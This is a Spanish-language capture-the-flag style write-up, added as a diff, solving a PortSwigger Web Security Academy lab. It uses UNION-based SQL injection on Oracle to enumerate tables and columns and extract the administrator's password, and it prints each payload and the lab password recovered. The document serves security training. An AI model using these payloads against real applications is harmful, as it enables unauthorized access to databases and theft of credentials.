@@ -1,0 +1,115 @@
+---
+title: "#6 - SQL injection attack, listing the database contents on Oracle"
+description: "Enumeración de tablas y columnas en Oracle mediante all_tables y all_tab_columns para extraer credenciales de administrator vía inyección SQL basada en UNION."
+date: "2026-07-13"
+tags: ["portswigger", "sql-injection", "oracle", "union-based", "practitioner"]
+category: "sql-injection"
+difficulty: "PRACTITIONER"
+---
+
+**Laboratorio:** [Lab: SQL injection attack, listing the database contents on Oracle | Web Security Academy](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
+
+- Objetivo:  Obtener las credenciales del usuario `administrator` y autenticarse en el sistema.
+
+## **Análisis inicial**
+
+La aplicación presenta artículos filtrados por categoría a través de una consulta SQL vulnerable, lo que permite inyectar sentencias maliciosas.
+
+## Consulta original:
+
+```sql
+SELECT * FROM articles WHERE category = ''
+```
+
+La consulta filtra los artículos según la categoría proporcionada en la URL. Esta entrada es vulnerable y puede ser manipulada para ejecutar consultas arbitrarias mediante la cláusula `UNION`.
+
+## 🔎 Observación sobre UNION
+
+La inyección SQL basada en `UNION` permite combinar resultados de múltiples sentencias `SELECT` en una sola salida. Es útil cuando el atacante quiere recuperar datos adicionales de otras tablas, como versiones, usuarios, contraseñas, etc.
+
+## Solución
+
+- **Determinar el número de columnas**
+    
+    Antes de usar `UNION`, necesitamos saber cuántas columnas devuelve la consulta original. Para eso, se usa la técnica `ORDER BY`.
+    
+    **Payloads utilizados:**
+    
+    ```sql
+    ' ORDER BY 1--
+    ' ORDER BY 2--
+    ' ORDER BY 3-- <-Error
+    ```
+    
+    - Se incrementa el número hasta provocar un error.
+    - En este caso, `ORDER BY 3` falla, lo que indica que hay **2 columnas**.
+    
+- **Validar la inyección `UNION`**
+    
+    Una vez sabemos que hay 2 columnas, probamos una inyección básica para confirmar que `UNION SELECT` funciona correctamente en Oracle.
+    
+    **Payload de prueba:**
+    
+    ```sql
+    ' UNION SELECT 'ABC','NULL' FROM dual--
+    ```
+    
+    - `'ABC'` y `'NULL'` son valores de prueba visibles en la respuesta.
+    - Esto confirma que la inyección funciona y el atacante puede controlar el contenido de la salida.
+
+- Verificar versión del motor de base de datos
+    
+    Aunque se conoce que el motor es Oracle, se valida esta información para tener certeza:
+    
+    ```sql
+    'UNION SELECT banner, 'NULL' FROM v$version--
+    ```
+    
+
+- Enumerar las tablas
+    
+    Enumeramos todas las tablas disponibles usando `all_tables`:
+    
+    ```sql
+    ' UNION SELECT table_name, NULL FROM all_tables--
+    ```
+    
+    Resultado:
+    
+    - **`USERS_ZPMLBH`**(el nombre puede variar)
+
+- Enumerar las columnas de la tabla
+    
+    Una vez identificada la tabla, se consultan sus columnas:
+    
+    ```sql
+    ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name  = 'USERS_ZPMLBH'--
+    ```
+    
+    Resultado:
+    
+    - **`PASSWORD_VDXITN`**(el nombre puede variar)
+    - **`EMAIL`**
+    - **`USERNAME_WFRUZK`**(el nombre puede variar)
+
+- Obtener credenciales del usuario `administrator`
+    
+    Finalmente, se extraen los datos sensibles directamente desde la tabla **`USERS_ZPMLBH`**:
+    
+    ```sql
+    ' UNION SELECT **USERNAME_WFRUZK**, **PASSWORD_VDXITN** FROM **USERS_ZPMLBH--**
+    ```
+    
+    Resultado:
+    
+    - Usuario: `administrator`
+    - Contraseña: `1dywelnjp05z7dkxmjjc`
+        
+        ![Resultado de la consulta UNION mostrando las credenciales del usuario administrator extraídas de la tabla USERS_ZPMLBH](/writeups/portswigger/6_sql_injection_listing_db_contents_oracle/image.png)
+        
+
+## ✅ Resultado
+
+Con las credenciales recuperadas, se accede al sistema como `administrator`.
+
+![Acceso exitoso al sistema como el usuario administrator usando las credenciales extraídas](/writeups/portswigger/6_sql_injection_listing_db_contents_oracle/2c2b8c46-0fc9-4daa-9e32-d2fa2649bae5.png)
